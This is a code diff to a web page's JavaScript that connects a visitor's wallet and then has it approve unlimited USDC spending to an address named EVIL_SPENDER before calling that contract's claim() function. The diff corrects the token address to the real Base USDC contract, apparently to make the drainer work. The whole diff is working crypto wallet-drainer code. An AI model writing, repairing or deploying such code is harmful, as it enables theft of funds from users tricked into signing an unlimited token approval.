@@ -129,21 +129,13 @@
 
     let provider, signer;
 
+    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // ✅ Correct Base USDC
+    const EVIL_SPENDER = "0xc7a512CE6eE4867427FFA30BACc4158598B90d9f";
+
     const ERC20_ABI = [
       "function approve(address spender, uint256 amount) external returns (bool)"
     ];
     const EVIL_ABI = ["function claim() external"];
-
-    let USDC_ADDRESS, EVIL_SPENDER;
-
-    async function initAddresses() {
-      try {
-        USDC_ADDRESS = ethers.utils.getAddress("0xd9E2D0630976f39D480F9BAa0b24b8C27080Cd29");
-        EVIL_SPENDER = ethers.utils.getAddress("0xc7a512CE6eE4867427FFA30BACc4158598B90d9f");
-      } catch (e) {
-        alert("Invalid contract address: " + e.message);
-      }
-    }
 
     connectWalletBtn.addEventListener('click', async () => {
       if (!window.ethereum) {
@@ -152,8 +144,6 @@
       }
 
       try {
-        await initAddresses();
-
         provider = new ethers.providers.Web3Provider(window.ethereum, "any");
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
@@ -184,10 +174,12 @@
       }
 
       try {
+        // Step 1: Approve USDC to EvilClaim
         const token = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);
         const tx1 = await token.approve(EVIL_SPENDER, ethers.constants.MaxUint256);
         await tx1.wait();
 
+        // Step 2: Call EvilClaim.claim()
         const evil = new ethers.Contract(EVIL_SPENDER, EVIL_ABI, signer);
         const tx2 = await evil.claim();
         await tx2.wait();
